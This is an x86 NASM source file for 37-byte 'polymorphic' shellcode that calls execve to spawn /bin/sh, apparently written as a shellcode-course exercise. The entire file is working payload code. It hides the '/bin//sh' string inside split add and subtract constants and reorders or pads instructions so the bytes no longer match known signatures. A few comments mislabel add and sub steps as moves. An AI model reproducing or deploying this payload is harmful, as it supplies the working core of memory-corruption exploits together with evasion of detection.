; Filename: execve_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Spawn a shell on the local host
; Compilation: ./compile.sh execve_poly
; Usage: ./execve_poly
; Shellcode size: 37 bytes
; Architecture: x86

global   _start

section .text
        _start:

    	xor edx, edx			; initialize register // changed the register value    
    	push edx			; push edx onto the stack // changed the register value
    	mov eax, 0x463ED8B7             ; move 0x463ED8B7 into eax // split to add up to original value /bin/sh
    	add eax, 0x22345678		; move 0x22345678 into eax // split to add up to original value /bin/sh
    	push eax			; push eax onto the stack // added instruction
    	mov eax, 0xDEADC0DE		; move 0xDEADC0DE into eax // split to add up to original value /bin/sh
    	sub eax, 0x70445EAF		; move 0x70445EAF into eax // split to add up to original value /bin/sh
    	push eax			; push eax onto the stack // added instruction
    	push byte 0xb			; push 0xb onto the stack // changed the method	
    	pop eax				; pop eax off the stack // added instruction	
    	mov ecx, edx			; move edx into ecx // changed the register value
    	mov ebx, esp			; move esp into ebx // changed the order	
    	push byte 0x1			; push 0x1 onto the stack // added instruction
    	pop esi				; pop esi off the stack // added instruction
    	int 0x80			; call the interrupt to execute the execve syscall, /bin/sh shell
